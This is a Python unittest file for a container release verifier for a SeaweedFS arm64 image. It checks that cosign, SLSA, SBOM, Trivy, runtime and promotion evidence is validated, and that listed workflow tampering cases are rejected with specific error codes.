            (hide_scratch_stage_in_continuation, "CONTAINERFILE_STAGE_PLAN"),
            (split_hidden_from_keyword, "CONTAINERFILE_STAGE_PLAN"),
            (hide_certificates_stage_in_heredoc, "CONTAINERFILE_HEREDOC"),
            (split_hidden_heredoc_opener, "CONTAINERFILE_HEREDOC"),
            (add_networked_builder_replacement, "CONTAINERFILE_BUILDER_STAGE"),
            (quote_checksum_pipe_as_data, "CONTAINERFILE_BUILDER_RUN"),
            (suppress_source_commit_expansion, "CONTAINERFILE_BUILDER_RUN"),
            (alter_module_bundle_hash, "MODULE_INPUT_HASH"),
            (permit_networked_module_build, "CONTAINERFILE_BUILDER_RUN"),
            (permit_legacy_cosign_records, "COSIGN_FORMAT_CONTRACT"),
            (unpin_action, "ACTION_NOT_SHA_PINNED"),
            (add_anonymous_unpinned_action, "WORKFLOW_STEP_CLOSED_WORLD"),
            (add_unnamed_run_step_and_rebind, "WORKFLOW_STEP_CLOSED_WORLD"),
            (add_bare_unnamed_run_step_and_rebind, "WORKFLOW_STEP_CLOSED_WORLD"),
            (
                add_noncanonical_unnamed_job_and_rebind,
                "WORKFLOW_STEP_CLOSED_WORLD",
            ),
            (
                add_explicit_key_unnamed_job_and_rebind,
                "WORKFLOW_STEP_CLOSED_WORLD",
            ),
            (
                add_flow_style_unnamed_job_and_rebind,
                "WORKFLOW_STEP_CLOSED_WORLD",
            ),
            (add_unapproved_pinned_action, "WORKFLOW_STEP_CLOSED_WORLD"),
            (weaken_trivy_policy_and_rebind, "TRIVY_SCAN_POLICY"),
            (drift_source_pin_and_rebind, "WORKFLOW_SOURCE_PIN"),
            (drift_source_checkout_and_rebind, "WORKFLOW_SOURCE_PIN"),
            (inject_dynamic_source_repository_and_rebind, "WORKFLOW_SOURCE_PIN"),
            (shadow_source_commit_with_flow_env_and_rebind, "WORKFLOW_SOURCE_PIN"),
            (
                shadow_source_commit_with_quoted_env_key_and_rebind,
                "WORKFLOW_SOURCE_PIN",
            ),
            (
                shadow_source_commit_with_explicit_env_key_and_rebind,
                "WORKFLOW_SOURCE_PIN",
            ),
            (expose_credentials_before_buildx_verification, "BUILDX_CREDENTIAL_BOUNDARY"),
            (hide_early_credentials_after_login_comment, "BUILDX_CREDENTIAL_BOUNDARY"),
            (change_final_retention, "FINAL_RETENTION"),
            (redirect_image_repository, "IMAGE_WORKFLOW_BINDING"),
            (restore_mutable_gha_cache, "BUILD_CACHE_POLICY"),
            (override_reviewed_go_image, "BUILD_ACTION_POLICY"),
            (override_reviewed_go_image_after_blank, "BUILD_ACTION_POLICY"),
            (redirect_reviewed_containerfile, "BUILD_ACTION_POLICY"),
            (continue_context_plain_scalar, "BUILD_ACTION_POLICY"),
            (truncate_build_step_with_comment_decoy, "BUILD_ACTION_POLICY"),
            (permit_issue_branch_publication, "MAIN_ONLY_PUBLICATION"),
            (detach_buildx_from_docker_plugin_discovery, "BUILDX_PLUGIN_DISCOVERY"),
            (conflate_workflow_and_source_sha, "WORKFLOW_SHA_SEMANTICS"),
            (remove_run_attempt_from_candidate_artifact, "WORKFLOW_CONTRACT_LITERAL"),
            (derive_candidate_from_promotion_attempt, "WORKFLOW_CONTRACT_LITERAL"),
            (move_promotion_preflight_after_tag, "PROMOTION_PREFLIGHT_ORDER"),
            (remove_promotion_dependency, "PROMOTION_DEPENDENCY"),
            (permit_runtime, "ADMISSION_RUNTIME_STATE"),
            (inject_command_into_approved_run_step, "WORKFLOW_HASH"),
        )
        for mutate, expected_code in cases:
            with self.subTest(expected_code=expected_code):
                self._assert_mutation_fails(mutate, expected_code)

    def test_rekor_uuid_accepts_both_official_lengths(self) -> None:
        for value in ("a" * 64, "B" * 80):
            with self.subTest(value=value):
                self.assertIsNotNone(verifier.REKOR_UUID_RE.fullmatch(value))
        for value in ("a" * 63, "a" * 65, "g" * 64):
            with self.subTest(value=value):
                self.assertIsNone(verifier.REKOR_UUID_RE.fullmatch(value))

    def test_repository_cosign_reverification_is_pinned_and_cryptographic(self) -> None:
        contract = {
            "toolchain": {"cosign": {"version": "v3.1.1"}},
        }
        with mock.patch.object(verifier.shutil, "which", return_value=None):
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._require_pinned_cosign(contract)
        self.assertEqual(caught.exception.code, "COSIGN_BINARY")

        release = {
            "identity": (
                "https://github.com/TommyKammy/Shirokuma/.github/workflows/"
                "seaweedfs-arm64.yml@refs/heads/main"
            ),
            "issuer": "https://token.actions.githubusercontent.com",
            "builder": {
                "workflow_name": "SeaweedFS 4.39 trusted arm64 build",
                "ref": "refs/heads/main",
                "repository": "TommyKammy/Shirokuma",
                "workflow_sha": "a" * 40,
            },
        }
        version = mock.Mock(
            returncode=0,
            stdout=json.dumps({"gitVersion": "v3.1.1"}),
            stderr="",
        )
        verified = mock.Mock(returncode=0, stdout="Verified OK\n", stderr="")
        with mock.patch.object(verifier.shutil, "which", return_value="/bin/cosign"), mock.patch.object(
            verifier.subprocess, "run", side_effect=[version, verified]
        ) as run:
            verifier._verify_retained_cosign_bundle(
                contract,
                release,
                Path("bundle.json"),
                Path("manifest.json"),
            )
        command = run.call_args_list[1].args[0]
        self.assertEqual(command[:2], ["/bin/cosign", "verify-blob"])
        self.assertIn("--bundle", command)
        self.assertIn("--certificate-identity", command)
        self.assertIn("--certificate-oidc-issuer", command)
        self.assertIn("--certificate-github-workflow-sha", command)
        self.assertEqual(command[-1], "manifest.json")

        rejected = mock.Mock(returncode=1, stdout="", stderr="invalid signature")
        with mock.patch.object(verifier.shutil, "which", return_value="/bin/cosign"), mock.patch.object(
            verifier.subprocess, "run", side_effect=[version, rejected]
        ):
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._verify_retained_cosign_bundle(
                    contract,
                    release,
                    Path("bundle.json"),
                    Path("manifest.json"),
                )
        self.assertEqual(caught.exception.code, "COSIGN_CRYPTO_VERIFY")

    def test_repository_attestation_reverification_is_pinned_and_cryptographic(
        self,
    ) -> None:
        contract = {"toolchain": {"cosign": {"version": "v3.1.1"}}}
        digest = "a" * 64
        release = {
            "reference": (
                "ghcr.io/tommykammy/shirokuma-seaweedfs@sha256:" + digest
            ),
            "identity": (
                "https://github.com/TommyKammy/Shirokuma/.github/workflows/"
                "seaweedfs-arm64.yml@refs/heads/main"
            ),
            "issuer": "https://token.actions.githubusercontent.com",
            "builder": {
                "workflow_name": "SeaweedFS 4.39 trusted arm64 build",
                "ref": "refs/heads/main",
                "repository": "TommyKammy/Shirokuma",
                "workflow_sha": "b" * 40,
                "trigger": "push",
            },
        }
        version = mock.Mock(
            returncode=0,
            stdout=json.dumps({"gitVersion": "v3.1.1"}),
            stderr="",
        )
        verified = mock.Mock(returncode=0, stdout="", stderr="Verified OK\n")
        with mock.patch.object(
            verifier.shutil, "which", return_value="/bin/cosign"
        ), mock.patch.object(
            verifier.subprocess, "run", side_effect=[version, verified]
        ) as run:
            verifier._verify_retained_attestation_bundle(
                contract,
                release,
                Path("bundle.json"),
                "https://slsa.dev/provenance/v1",
            )
        command = run.call_args_list[1].args[0]
        self.assertEqual(
            command[:2], ["/bin/cosign", "verify-blob-attestation"]
        )
        self.assertIn("--certificate-github-workflow-trigger", command)
        self.assertEqual(command[command.index("--digest") + 1], digest)
        self.assertEqual(command[command.index("--digestAlg") + 1], "sha256")

        rejected = mock.Mock(returncode=1, stdout="", stderr="invalid DSSE")
        with mock.patch.object(
            verifier.shutil, "which", return_value="/bin/cosign"
        ), mock.patch.object(
            verifier.subprocess, "run", side_effect=[version, rejected]
        ):
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._verify_retained_attestation_bundle(
                    contract,
                    release,
                    Path("bundle.json"),
                    "https://slsa.dev/provenance/v1",
                )
        self.assertEqual(caught.exception.code, "ATTESTATION_CRYPTO_VERIFY")

    def test_signed_sbom_and_trivy_predicates_must_equal_retained_evidence(
        self,
    ) -> None:
        contract = verifier.load_contract(ROOT)
        digest = "a" * 64
        repository = "ghcr.io/tommykammy/shirokuma-seaweedfs"
        release = {
            "reference": f"{repository}@sha256:{digest}",
        }
        predicates = {
            "sbom": {
                "bomFormat": "CycloneDX",
                "components": [{"name": "weed"}],
            },
            "vulnerability_scan": {"Results": []},
        }
        contracts = contract["toolchain"]["cosign"]["attestation_predicates"]
        for kind, predicate in predicates.items():
            with self.subTest(kind=kind), tempfile.TemporaryDirectory() as directory:
                predicate_contract = contracts[kind]
                statement = {
                    "_type": "https://in-toto.io/Statement/v0.1",
                    "predicateType": predicate_contract["predicate_type"],
                    "subject": [
                        {"name": repository, "digest": {"sha256": digest}}
                    ],
                    "predicate": predicate,
                }
                bundle = self._attestation_bundle(contract, statement)
                root = Path(directory)
                bundle_path = root / predicate_contract["artifact"]
                predicate_path = root / f"{kind}.json"
                bundle_path.write_text(json.dumps(bundle), encoding="utf-8")
                predicate_path.write_text(json.dumps(predicate), encoding="utf-8")
                verifier._validate_attested_predicate_bundle(
                    release,
                    contract,
                    bundle_path,
                    predicate_path,
                    predicate_contract,
                )
                with mock.patch.object(
                    verifier, "_verify_retained_attestation_bundle"
                ) as verify:
                    verifier._validate_attested_predicate_bundle(
                        release,
                        contract,
                        bundle_path,
                        predicate_path,
                        predicate_contract,
                        cryptographic_reverification=True,
                    )
                verify.assert_called_once_with(
                    contract,
                    release,
                    bundle_path,
                    predicate_contract["cli_type"],
                )

                predicate_path.write_text(json.dumps({}), encoding="utf-8")
                with self.assertRaises(verifier.ContractError) as caught:
                    verifier._validate_attested_predicate_bundle(
                        release,
                        contract,
                        bundle_path,
                        predicate_path,
                        predicate_contract,
                    )
                self.assertEqual(caught.exception.code, "ATTESTATION_PREDICATE")

    def test_attested_predicate_bundle_rejects_identity_and_format_tampering(
        self,
    ) -> None:
        contract = verifier.load_contract(ROOT)
        digest = "a" * 64
        repository = "ghcr.io/tommykammy/shirokuma-seaweedfs"
        release = {"reference": f"{repository}@sha256:{digest}"}
        predicate = {"bomFormat": "CycloneDX", "components": []}
        predicate_contract = contract["toolchain"]["cosign"][
            "attestation_predicates"
        ]["sbom"]
        baseline_statement = {
            "_type": "https://in-toto.io/Statement/v0.1",
            "predicateType": predicate_contract["predicate_type"],
            "subject": [{"name": repository, "digest": {"sha256": digest}}],
            "predicate": predicate,
        }

        def write_bundle(path: Path, bundle: dict[str, object]) -> None:
            path.write_text(json.dumps(bundle), encoding="utf-8")

        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            bundle_path = root / predicate_contract["artifact"]
            predicate_path = root / "sbom.json"
            predicate_path.write_text(json.dumps(predicate), encoding="utf-8")
            statement_cases = (
                (
                    lambda value: value.update({"predicateType": "wrong"}),
                    "ATTESTATION_STATEMENT",
                ),
                (
                    lambda value: value["subject"][0].update({"name": "wrong"}),
                    "ATTESTATION_SUBJECT",
                ),
                (
                    lambda value: value["subject"][0]["digest"].update(
                        {"sha256": "b" * 64}
                    ),
                    "ATTESTATION_SUBJECT",
                ),
                (
                    lambda value: value["subject"].append(value["subject"][0]),
                    "ATTESTATION_SUBJECT",
                ),
            )
            for mutate, expected_code in statement_cases:
                with self.subTest(expected_code=expected_code, mutate=mutate):
                    statement = json.loads(json.dumps(baseline_statement))
                    mutate(statement)
                    write_bundle(
                        bundle_path,
                        self._attestation_bundle(contract, statement),
                    )
                    with self.assertRaises(verifier.ContractError) as caught:
                        verifier._validate_attested_predicate_bundle(
                            release,
                            contract,
                            bundle_path,
                            predicate_path,
                            predicate_contract,
                        )
                    self.assertEqual(caught.exception.code, expected_code)

            format_cases = (
                lambda value: value.pop("dsseEnvelope"),
                lambda value: value["dsseEnvelope"].pop("payload"),
                lambda value: value["dsseEnvelope"].pop("signatures"),
                lambda value: value.pop("verificationMaterial"),
                lambda value: value["verificationMaterial"].pop("certificate"),
                lambda value: value["verificationMaterial"].update(
                    {"tlogEntries": []}
                ),
            )
            for mutate in format_cases:
                with self.subTest(format_mutation=mutate):
                    bundle = self._attestation_bundle(
                        contract,
                        json.loads(json.dumps(baseline_statement)),
                    )
                    mutate(bundle)
                    write_bundle(bundle_path, bundle)
                    with self.assertRaises(verifier.ContractError) as caught:
                        verifier._validate_attested_predicate_bundle(
                            release,
                            contract,
                            bundle_path,
                            predicate_path,
                            predicate_contract,
                        )
                    self.assertEqual(
                        caught.exception.code,
                        "ATTESTATION_BUNDLE_FORMAT",
                    )

            malformed = self._attestation_bundle(contract, baseline_statement)
            malformed["dsseEnvelope"]["payload"] = {"not": "base64"}
            write_bundle(bundle_path, malformed)
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._validate_attested_predicate_bundle(
                    release,
                    contract,
                    bundle_path,
                    predicate_path,
                    predicate_contract,
                )
            self.assertEqual(caught.exception.code, "ATTESTATION_BUNDLE_FORMAT")

    def test_repository_mode_is_propagated_to_every_attestation_validator(
        self,
    ) -> None:
        contract = verifier.load_contract(ROOT)
        paths = {
            "slsa-verify.json": Path("slsa-verify.json"),
            "slsa-bundles.jsonl": Path("slsa-bundles.jsonl"),
            "sbom-attestation-bundle.json": Path("sbom-bundle.json"),
            "seaweedfs-4.39-arm64.cdx.json": Path("sbom.json"),
            "trivy-attestation-bundle.json": Path("trivy-bundle.json"),
            "trivy.json": Path("trivy.json"),
        }
        release: dict[str, object] = {}
        with mock.patch.object(verifier, "_validate_slsa") as slsa, mock.patch.object(
            verifier, "_validate_attested_predicate_bundle"
        ) as predicate:
            verifier._validate_retained_attestations(
                release,
                contract,
                paths,
                cryptographic_reverification=True,
            )
        slsa.assert_called_once_with(
            release,
            contract,
            paths["slsa-verify.json"],
            paths["slsa-bundles.jsonl"],
            cryptographic_reverification=True,
        )
        self.assertEqual(predicate.call_count, 2)
        self.assertTrue(
            all(
                call.kwargs == {"cryptographic_reverification": True}
                for call in predicate.call_args_list
            )
        )

    def test_slsa_repository_mode_reverifies_each_exact_bundle(self) -> None:
        contract = verifier.load_contract(ROOT)
        digest = "a" * 64
        repository = "TommyKammy/Shirokuma"
        repository_url = f"https://github.com/{repository}"
        image_repository = "ghcr.io/tommykammy/shirokuma-seaweedfs"
        workflow_path = ".github/workflows/seaweedfs-arm64.yml"
        workflow_ref = "refs/heads/main"
        workflow_sha = "b" * 40
        source_sha = "c" * 40
        identity = f"{repository_url}/{workflow_path}@{workflow_ref}"
        invocation = f"{repository_url}/actions/runs/123/attempts/4"
        builder = {
            "repository": repository,
            "workflow_name": "SeaweedFS 4.39 trusted arm64 build",
            "workflow": workflow_path,
            "ref": workflow_ref,
            "workflow_sha": workflow_sha,
            "source_sha": source_sha,
            "trigger": "push",
            "run_id": "123",
            "run_attempt": "4",
        }
        release = {
            "reference": f"{image_repository}@sha256:{digest}",
            "identity": identity,
            "issuer": "https://token.actions.githubusercontent.com",
            "builder": builder,
        }
        statement = {
            "_type": "https://in-toto.io/Statement/v1",
            "predicateType": "https://slsa.dev/provenance/v1",
            "subject": [
                {"name": image_repository, "digest": {"sha256": digest}}
            ],
            "predicate": {
                "buildDefinition": {
                    "buildType": "https://actions.github.io/buildtypes/workflow/v1",
                    "externalParameters": {
                        "workflow": {
                            "repository": repository_url,
                            "path": workflow_path,
                            "ref": workflow_ref,
                        }
                    },
                    "internalParameters": {
                        "github": {
                            "event_name": "push",
                            "runner_environment": "github-hosted",
                        }
                    },
                    "resolvedDependencies": [
                        {
                            "uri": f"git+{repository_url}@{workflow_ref}",
                            "digest": {"gitCommit": source_sha},
                        }
                    ],
                },
                "runDetails": {
                    "builder": {"id": identity},
                    "metadata": {"invocationId": invocation},
                },
            },
        }
        bundle = self._attestation_bundle(contract, statement)
        certificate = {
            "issuer": release["issuer"],
            "subjectAlternativeName": identity,
            "githubWorkflowName": builder["workflow_name"],
            "githubWorkflowRepository": repository,
            "githubWorkflowRef": workflow_ref,
            "githubWorkflowSHA": workflow_sha,
            "githubWorkflowTrigger": "push",
            "buildTrigger": "push",
            "runnerEnvironment": "github-hosted",
            "buildSignerURI": identity,
            "buildSignerDigest": workflow_sha,
            "buildConfigURI": identity,
            "buildConfigDigest": workflow_sha,
            "sourceRepositoryURI": repository_url,
            "sourceRepositoryDigest": source_sha,
            "sourceRepositoryRef": workflow_ref,
            "runInvocationURI": invocation,
        }
        record = {
            "verificationResult": {"signature": {"certificate": certificate}},
            "attestation": {"bundle": bundle},
        }
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            records_path = root / "slsa-verify.json"
            bundles_path = root / "slsa-bundles.jsonl"
            records_path.write_text(json.dumps([record]), encoding="utf-8")
            bundles_path.write_text(json.dumps(bundle) + "\n", encoding="utf-8")
            with mock.patch.object(
                verifier, "_verify_retained_attestation_bundle"
            ) as verify:
                verifier._validate_slsa(
                    release,
                    contract,
                    records_path,
                    bundles_path,
                    cryptographic_reverification=True,
                )
            verify.assert_called_once()
            self.assertEqual(
                verify.call_args.args[-1], "https://slsa.dev/provenance/v1"
            )

            wrong_statement = json.loads(json.dumps(statement))
            wrong_statement["predicate"]["buildDefinition"][
                "resolvedDependencies"
            ][0]["digest"]["gitCommit"] = "d" * 40
            wrong_bundle = self._attestation_bundle(contract, wrong_statement)
            wrong_record = json.loads(json.dumps(record))
            wrong_record["attestation"]["bundle"] = wrong_bundle
            records_path.write_text(
                json.dumps([wrong_record]), encoding="utf-8"
            )
            bundles_path.write_text(
                json.dumps(wrong_bundle) + "\n", encoding="utf-8"
            )
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._validate_slsa(
                    release,
                    contract,
                    records_path,
                    bundles_path,
                )
            self.assertEqual(caught.exception.code, "SLSA_WORKFLOW_IDENTITY")

    def test_release_admission_status_uses_the_declared_contract_state(self) -> None:
        contract = verifier.load_contract(ROOT)
        release = {"admission_status": "approved"}
        verifier._validate_release_admission_status(release, contract)
        release["admission_status"] = "pending_main_publication"
        with self.assertRaises(verifier.ContractError) as caught:
            verifier._validate_release_admission_status(release, contract)
        self.assertEqual(caught.exception.code, "RELEASE_ADMISSION_STATUS")

    def test_runtime_smoke_is_bound_to_raw_docker_inspect(self) -> None:
        release = {
            "reference": "ghcr.io/tommykammy/shirokuma-seaweedfs@sha256:" + "a" * 64,
            "digest": "sha256:" + "a" * 64,
            "builder": {"run_id": "12345", "run_attempt": "2"},
            "source": {
                "module_inputs": {"bundle_sha256": "b" * 64},
            },
        }
        inspect_payload = [
            {
                "Config": {
                    "User": "65532:65532",
                    "Labels": {
                        "dev.shirokuma.go-vendor-bundle.sha256": "b" * 64,
                    },
                },
                "Path": "/usr/bin/weed",
                "Args": ["mini", "-dir=/data"],
                "HostConfig": {
                    "ReadonlyRootfs": True,
                    "Tmpfs": {
                        "/tmp": "rw,nosuid,nodev,size=16m,uid=65532,gid=65532,mode=1777",
                        "/data": "rw,nosuid,nodev,size=64m,uid=65532,gid=65532,mode=0755",
                    },
                    "CapDrop": ["ALL"],
                    "SecurityOpt": ["no-new-privileges:true"],
                    "PidsLimit": 256,
                    "Memory": 536870912,
                },
            }
        ]
        with tempfile.TemporaryDirectory() as directory:
            evidence = Path(directory)
            inspect_path = evidence / "runtime-inspect.json"
            smoke_path = evidence / "runtime-smoke.json"
            inspect_path.write_text(json.dumps(inspect_payload), encoding="utf-8")
            smoke = {
                "schema_version": 2,
                "result": "passed",
                "reference": release["reference"],
                "digest": release["digest"],
                "user": "65532:65532",
                "command": ["/usr/bin/weed", "mini", "-dir=/data"],
                "read_only_rootfs": True,
                "tmpfs": ["/tmp", "/data"],
                "capabilities_dropped": "ALL",
                "no_new_privileges": True,
                "sustained_running_seconds": 10,
                "run_id": "12345",
                "run_attempt": "2",
                "runtime_inspect": {
                    "file": inspect_path.name,
                    "sha256": verifier._sha256(inspect_path),
                },
            }
            smoke_path.write_text(json.dumps(smoke), encoding="utf-8")

            verifier._validate_runtime(release, smoke_path, inspect_path)

            inspect_payload[0]["Config"]["User"] = "0:0"
            inspect_path.write_text(json.dumps(inspect_payload), encoding="utf-8")
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._validate_runtime(release, smoke_path, inspect_path)
            self.assertEqual(caught.exception.code, "RUNTIME_INSPECT_USER")

    def test_promotion_preflight_binds_lineage_before_credentials(self) -> None:
        digest = "sha256:" + "b" * 64
        release = {
            "digest": digest,
            "builder": {"run_id": "67890", "run_attempt": "3"},
            "actions_artifact": {
                "candidate_name": "seaweedfs-4.39-arm64-candidate-67890-3",
            },
        }
        with mock.patch.object(
            verifier,
            "validate_release_bundle",
            return_value=release,
        ):
            verifier.validate_promotion_preflight(
                ROOT,
                Path("candidate-evidence"),
                "67890",
                "4",
                digest,
                "seaweedfs-4.39-arm64-candidate-67890-3",
            )
            candidate_name = release["actions_artifact"]["candidate_name"]
            invalid_cases = (
                (
                    "99999",
                    "4",
                    digest,
                    candidate_name,
                    "PROMOTION_RUN_IDENTITY",
                ),
                (
                    "67890",
                    "2",
                    digest,
                    candidate_name,
                    "PROMOTION_ATTEMPT_ORDER",
                ),
                (
                    "67890",
                    "4",
                    "sha256:" + "c" * 64,
                    candidate_name,
                    "PROMOTION_TARGET_DIGEST",
                ),
                (
                    "67890",
                    "4",
                    digest,
                    "seaweedfs-4.39-arm64-candidate-67890-4",
                    "PROMOTION_CANDIDATE_ARTIFACT",
                ),
            )
            for run_id, attempt, target, artifact, expected_code in invalid_cases:
                with self.subTest(expected_code=expected_code):
                    with self.assertRaises(verifier.ContractError) as caught:
                        verifier.validate_promotion_preflight(
                            ROOT,
                            Path("candidate-evidence"),
                            run_id,
                            attempt,
                            target,
                            artifact,
                        )
                    self.assertEqual(caught.exception.code, expected_code)

    def test_promotion_is_bound_to_the_candidate_release_snapshot(self) -> None:
        contract = verifier.load_contract(ROOT)
        digest = "sha256:" + "b" * 64
        builder = {"run_id": "67890", "run_attempt": "3"}
        promotion_attempt = "4"
        candidate_artifact = "seaweedfs-4.39-arm64-candidate-67890-3"

        with tempfile.TemporaryDirectory() as directory:
            evidence = Path(directory)
            candidate_path = evidence / "candidate-release-evidence.json"
            promotion_path = evidence / "promotion-evidence.json"
            candidate_release = {
                "schema_version": 2,
                "component": contract["component"],
                "version": contract["version"],
                "platform": contract["platform"],
                "reference": contract["image"]["repository"] + "@" + digest,
                "digest": digest,
                "builder": builder,
                "contract": {"sha256": "c" * 64},
                "promotion": {
                    "status": "pending",
                    "trusted_tag": contract["image"]["trusted_tag"],
                    "tool": "crane",
                },
                "actions_artifact": {
                    "role": contract["evidence"]["actions_artifact_role"],
                    "candidate_name": candidate_artifact,
                    "retention_days": contract["evidence"]["candidate_retention_days"],
                },
                "artifacts": {"source.json": "d" * 64},
            }
            candidate_path.write_text(json.dumps(candidate_release), encoding="utf-8")
            candidate_hash = verifier._sha256(candidate_path)
            release = dict(candidate_release)
            release["promotion"] = {
                "status": "verified",
                "run_id": builder["run_id"],
                "run_attempt": promotion_attempt,
                "trusted_tag": contract["image"]["trusted_tag"],
                "trusted_tag_role": contract["image"]["trusted_tag_role"],
                "trusted_tag_digest": digest,
                "evidence": promotion_path.name,
                "candidate_artifact": candidate_artifact,
                "candidate_release_evidence": candidate_path.name,
                "candidate_release_sha256": candidate_hash,
            }
            release["actions_artifact"] = {
                "role": contract["evidence"]["actions_artifact_role"],
                "final_name": "seaweedfs-4.39-arm64-67890-4",
                "retention_days": contract["evidence"]["final_retention_days"],
            }
            release["artifacts"] = {
                **candidate_release["artifacts"],
                candidate_path.name: candidate_hash,
                promotion_path.name: "e" * 64,
            }
            promotion = {
                "schema_version": 1,
                "status": "verified",
                "reference": release["reference"],
                "trusted_tag": (
                    contract["image"]["repository"]
                    + ":"
                    + contract["image"]["trusted_tag"]
                ),
                "trusted_tag_role": contract["image"]["trusted_tag_role"],
                "trusted_tag_digest": digest,
                "promoted_at": "2026-07-15T00:00:00Z",
                "run_id": builder["run_id"],
                "run_attempt": promotion_attempt,
                "tool": {
                    "name": "crane",
                    "version": contract["toolchain"]["crane"]["version"],
                    "archive_sha256": contract["toolchain"]["crane"][
                        "linux_arm64_archive_sha256"
                    ],
                    "verified_before_registry_login": True,
                },
                "candidate": {
                    "artifact_name": candidate_artifact,
                    "snapshot_file": candidate_path.name,
                    "release_evidence_sha256": candidate_hash,
                    "contract_sha256": release["contract"]["sha256"],
                },
            }
            promotion_path.write_text(json.dumps(promotion), encoding="utf-8")

            self.assertEqual(
                verifier._expected_actions_artifact_name(release, False),
                "seaweedfs-4.39-arm64-candidate-67890-3",
            )
            self.assertEqual(
                verifier._expected_actions_artifact_name(release, True),
                "seaweedfs-4.39-arm64-67890-4",
            )
            verifier._validate_promotion(
                release,
                contract,
                promotion_path,
                candidate_path,
            )

            promotion["candidate"]["artifact_name"] = (
                "seaweedfs-4.39-arm64-candidate-67890-4"
            )
            promotion_path.write_text(json.dumps(promotion), encoding="utf-8")
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._validate_promotion(
                    release,
                    contract,
                    promotion_path,
                    candidate_path,
                )
            self.assertEqual(caught.exception.code, "PROMOTION_CANDIDATE_ARTIFACT")
            promotion["candidate"]["artifact_name"] = candidate_artifact

            promotion["run_attempt"] = "2"
            release["promotion"]["run_attempt"] = "2"
            promotion_path.write_text(json.dumps(promotion), encoding="utf-8")
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._validate_promotion(
                    release,
                    contract,
                    promotion_path,
                    candidate_path,
                )
            self.assertEqual(caught.exception.code, "PROMOTION_ATTEMPT_ORDER")
            promotion["run_attempt"] = promotion_attempt
            release["promotion"]["run_attempt"] = promotion_attempt

            release["promotion"]["run_attempt"] = "5"
            promotion_path.write_text(json.dumps(promotion), encoding="utf-8")
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._validate_promotion(
                    release,
                    contract,
                    promotion_path,
                    candidate_path,
                )
            self.assertEqual(
                caught.exception.code,
                "RELEASE_PROMOTION_RUN_IDENTITY",
            )
            release["promotion"]["run_attempt"] = promotion_attempt

            candidate_release["component"] = "mutated-after-validation"
            candidate_path.write_text(json.dumps(candidate_release), encoding="utf-8")
            with self.assertRaises(verifier.ContractError) as caught:
                verifier._validate_promotion(
                    release,
                    contract,
                    promotion_path,
                    candidate_path,
                )
            self.assertEqual(caught.exception.code, "PROMOTION_CANDIDATE_HASH")


if __name__ == "__main__":
    unittest.main()
